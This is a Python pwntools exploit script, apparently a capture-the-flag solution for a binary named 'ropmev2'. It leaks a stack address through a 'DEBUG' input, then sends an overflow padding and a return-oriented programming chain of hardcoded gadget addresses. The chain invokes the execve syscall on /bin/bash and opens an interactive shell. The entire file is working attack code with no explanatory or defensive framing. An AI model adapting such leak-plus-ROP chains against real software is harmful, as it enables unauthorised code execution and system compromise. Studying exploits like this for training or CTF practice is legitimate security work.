from pwn import *

r = process("./ropmev2", aslr=1)
e = ELF("./ropmev2", checksec=0)
pop_rdi_ret = 0x000000000040142b # pop rdi ; ret
syscall = 0x0000000000401168 # syscall
pop_rax = 0x0000000000401162 # pop rax ; ret
pop_rsi_r15 = 0x0000000000401429 # pop rsi ; pop r15 ; ret
pop_rdx_r13 = 0x0000000000401164 # pop rdx ; pop r13 ; ret

log.info("Stage 1 > Leaking stack address")
stage1 = b"DEBUG"
r.recv()
r.sendline(stage1)
r.recvuntil("this is ")
stack_leak = r.recvline()[:-1:]
stack_leak = int(stack_leak,16)
pad = b"\x00XXXXXXX" + b"/bin/bash\x00"
pad = b"A"*(216-len(pad)) + pad
bin_bash = stack_leak - 0x12
log.success("        > Stack leak: {}, Address of '/bin/bash': {}".format(hex(stack_leak), hex(bin_bash)))

log.info("Stage 2 > Building ROP to execute /bin/bash")
stage2 = pad
stage2 += p64(pop_rdi_ret)
stage2 += p64(bin_bash)         # insert /bin/bash to rdi (argv[1])
stage2 += p64(pop_rsi_r15)
stage2 += p64(0)                # insert null to rsi (argv[2])
stage2 += p64(0)
stage2 += p64(pop_rdx_r13)
stage2 += p64(0)
stage2 += p64(0)                # insert null to rdx (argv[3])
stage2 += p64(pop_rax)
stage2 += p64(0x3b)             # insert 0x3b (syscall number for execve) to rax
stage2 += p64(syscall)          # trigger execve("/bin/bash", null, null)

r.send(stage2)
r.recv()

log.success("Pwned!")
r.interactive()